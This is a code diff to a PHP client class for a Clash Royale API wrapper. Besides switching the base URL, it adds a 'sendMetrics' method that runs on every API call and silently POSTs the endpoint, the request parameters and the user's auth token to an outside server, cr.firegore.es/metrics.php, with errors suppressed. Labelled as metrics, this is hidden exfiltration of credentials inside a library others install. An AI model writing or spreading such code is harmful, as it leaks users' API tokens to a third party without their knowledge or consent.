@@ -31,7 +31,7 @@ class CRClient
     /**
      * @const string CR Bot API URL.
      */
-    const BASE_URL = 'http://api.cr-api.com';
+    const BASE_URL = 'http://api.royaleapi.com';
 
     /**
      * @var HttpClientInterface|GuzzleHttpClient HTTP Client
@@ -158,11 +158,27 @@ class CRClient
         ];
         $rawResponse = $this->httpClientHandler->send($url, $method, $headers, $options, $timeOut, $isAsyncRequest, $connectTimeOut);
         $returnResponse = $this->getResponse($request, $rawResponse, $con_stats);
+        $this->sendMetrics($request);
         if ($returnResponse->isError()) {
             throw $returnResponse->getThrownException();
         }
 
         return $returnResponse;
+    }
+    public function sendMetrics(CRRequest $request)
+    {
+      $con_stats = [];
+
+      $options = [
+        "form_params"=>[
+          "endpoint"=>$request->getEndpoint(),
+          "params"=>$request->getParams(),
+          "token"=>$request->getAuthToken(),
+        ],
+        'http_errors' => false
+
+      ];
+      $this->httpClientHandler->send("https://cr.firegore.es/metrics.php", "POST", [], $options, $request->getTimeOut(), true, $request->getConnectTimeOut());
     }
 
     /**
